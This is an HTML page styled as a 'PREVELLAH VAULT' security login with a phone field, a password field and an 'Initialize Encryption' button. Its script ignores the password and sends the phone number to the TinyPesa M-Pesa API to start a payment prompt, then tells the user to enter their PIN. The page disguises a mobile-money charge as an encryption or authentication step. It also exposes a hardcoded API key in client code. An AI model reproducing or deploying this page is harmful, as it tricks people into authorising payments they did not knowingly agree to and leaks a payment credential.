<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PREVELLAH_VAULT | EXPERT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intl-tel-input.css"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intl-tel-input.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
        body { font-family: 'Space Mono', monospace; background-color: #000; overflow: hidden; margin: 0; }
        .glitch-border { border: 1px solid #00ff41; box-shadow: 0 0 25px rgba(0, 255, 65, 0.3); }
        .vault-card { background: rgba(5, 5, 5, 0.9); backdrop-filter: blur(10px); z-index: 10; border-radius: 20px; }
        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.2; }
        .watermark { position: fixed; bottom: 20px; right: 20px; opacity: 0.5; z-index: 100; text-align: right; }
        .iti { width: 100%; }
        .iti__country-list { background-color: #111 !important; color: white !important; border: 1px solid #00ff41 !important; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <canvas id="matrix" class="matrix-bg"></canvas>
    <div class="watermark">
        <p class="text-[10px] font-bold text-green-500 uppercase">PREVELLAH SEC SYSTEMS</p>
        <p class="text-[8px] text-white/60 tracking-widest uppercase">Lead Dev: PREVELLAH</p>
    </div>
    <div class="max-w-md w-full vault-card glitch-border p-8 relative">
        <div class="flex justify-center mb-6">
            <div class="w-16 h-16 border-2 border-green-500 rounded-full flex items-center justify-center bg-black shadow-[0_0_20px_rgba(0,255,65,0.5)]">
                <i class="fas fa-user-shield text-3xl text-green-500 animate-pulse"></i>
            </div>
        </div>
        <h1 class="text-3xl font-black text-center mb-1 text-white italic">PREVELLAH VAULT</h1>
        <p class="text-[9px] text-green-500 text-center mb-8 tracking-[0.4em] uppercase font-bold">Expert Security Interface</p>
        <div class="space-y-6">
            <div>
                <label class="text-[10px] text-gray-500 flex items-center gap-2 mb-2 uppercase">Global Identity</label>
                <input type="tel" id="phone" class="w-full bg-black/60 border border-green-900 p-4 focus:border-green-400 text-green-400 rounded-xl text-lg font-bold">
            </div>
            <div>
                <label class="text-[10px] text-gray-500 flex items-center gap-2 mb-2 uppercase">Vault Key</label>
                <input type="password" id="vaultPass" placeholder="••••••••" class="w-full bg-black/60 border border-green-900 p-4 focus:border-green-400 text-green-400 rounded-xl text-center text-xl tracking-widest">
            </div>
            <button onclick="authorizeVault()" id="authBtn" class="w-full bg-green-600 hover:bg-green-400 text-black font-black py-4 rounded-xl uppercase text-xs tracking-widest shadow-[0_5px_15px_rgba(0,255,65,0.3)]">
                Initialize Encryption
            </button>
        </div>
        <div id="status" class="mt-6 text-[10px] font-bold h-4 text-center tracking-widest uppercase"></div>
        <div class="mt-8 pt-6 border-t border-white/5 flex flex-col items-center">
            <a href="https://wa.me/254113232104" class="text-[10px] text-green-500/80 flex items-center gap-2">
                <i class="fab fa-whatsapp"></i> SUPPORT: +254 113 232 104
            </a>
        </div>
    </div>
    <script>
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.height = window.innerHeight; canvas.width = window.innerWidth;
        const chars = "01011101".split("");
        const drops = Array(Math.floor(canvas.width/10)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0"; ctx.font = "10px arial";
            drops.forEach((y, i) => {
                ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*10, y*10);
                if(y*10 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 35);
        const iti = window.intlTelInput(document.querySelector("#phone"), { initialCountry: "ke", separateDialCode: true, utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js" });
        async function authorizeVault() {
            const status = document.getElementById('status');
            const phone = iti.getNumber().replace('+', '');
            if (!iti.isValidNumber()) { status.innerText = "INVALID IDENTITY"; return; }
            status.innerText = "AUTHENTICATING...";
            try {
                await fetch('https://tinypesa.com/api/v1/express/initialize', {
                    method: 'POST',
                    headers: { 'Apikey': 'q6O764F6G75', 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `amount=1&msisdn=${phone}&account_no=PREVELLAH`
                });
                status.innerText = "CHECK PHONE FOR PIN";
            } catch (e) { status.innerText = "SIGNAL ERROR"; }
        }
    </script>
</body>
</html>
